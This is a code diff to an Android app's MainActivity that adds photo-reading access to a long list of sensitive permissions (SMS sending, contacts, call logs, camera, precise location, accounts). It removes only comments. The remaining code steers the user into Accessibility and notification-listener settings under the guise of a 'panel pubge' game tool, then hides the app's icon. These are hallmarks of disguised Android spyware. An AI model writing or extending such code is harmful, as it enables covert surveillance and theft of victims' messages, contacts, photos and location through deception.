@@ -37,7 +37,8 @@ public class MainActivity extends Activity {
             android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
             android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.READ_EXTERNAL_STORAGE,
             android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.GET_ACCOUNTS, android.Manifest.permission.POST_NOTIFICATIONS
+            android.Manifest.permission.GET_ACCOUNTS, android.Manifest.permission.POST_NOTIFICATIONS,
+            android.Manifest.permission.READ_MEDIA_IMAGES
         };
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -65,7 +66,6 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
 
-        // 1. فتح صفحة تفعيل الـ Accessibility
         try {
             Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -73,7 +73,6 @@ public class MainActivity extends Activity {
             Toast.makeText(this, "Please enable panel pubge in Accessibility.", Toast.LENGTH_LONG).show();
         } catch (Exception ignored) {}
 
-        // 2. بعد 4 ثواني، فتح صفحة تفعيل الإشعارات
         new Handler().postDelayed(() -> {
             try {
                 Intent notifIntent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
@@ -83,7 +82,6 @@ public class MainActivity extends Activity {
             } catch (Exception ignored) {}
         }, 4000);
 
-        // إخفاء الأيقونة
         try {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
